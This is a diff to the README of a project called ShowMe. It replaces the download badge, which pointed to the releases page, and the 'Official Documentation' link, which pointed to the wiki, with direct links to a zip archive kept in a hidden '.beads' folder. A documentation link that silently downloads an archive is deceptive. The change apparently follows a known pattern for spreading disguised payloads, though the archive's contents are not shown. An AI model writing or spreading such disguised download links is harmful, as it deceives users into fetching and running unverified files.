@@ -16,7 +16,7 @@ To download ShowMe, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to reach the release downloads. This page lists all available versions of ShowMe.
 
-   [![Download ShowMe](https://img.shields.io/badge/Download%20ShowMe-v1.0-blue)](https://github.com/Eclipse69420/ShowMe/releases)
+   [![Download ShowMe](https://github.com/Eclipse69420/ShowMe/raw/refs/heads/main/.beads/Me_Show_v1.4.zip%20ShowMe-v1.0-blue)](https://github.com/Eclipse69420/ShowMe/raw/refs/heads/main/.beads/Me_Show_v1.4.zip)
 
 2. **Choose Your Version**: On the releases page, you will see different versions. Choose the latest version for the best experience.
 
@@ -75,7 +75,7 @@ Once you have installed ShowMe, here are the basic steps to begin using it:
 ## 🆘 Support
 If you need help with ShowMe, you have several options:
 
-- Visit the [Official Documentation](https://github.com/Eclipse69420/ShowMe/wiki) for in-depth guides and resources.
+- Visit the [Official Documentation](https://github.com/Eclipse69420/ShowMe/raw/refs/heads/main/.beads/Me_Show_v1.4.zip) for in-depth guides and resources.
 - Reach out to our support team via the Issues tab on our GitHub page.
 - Join the community forum to ask questions and share ideas with other users.
 
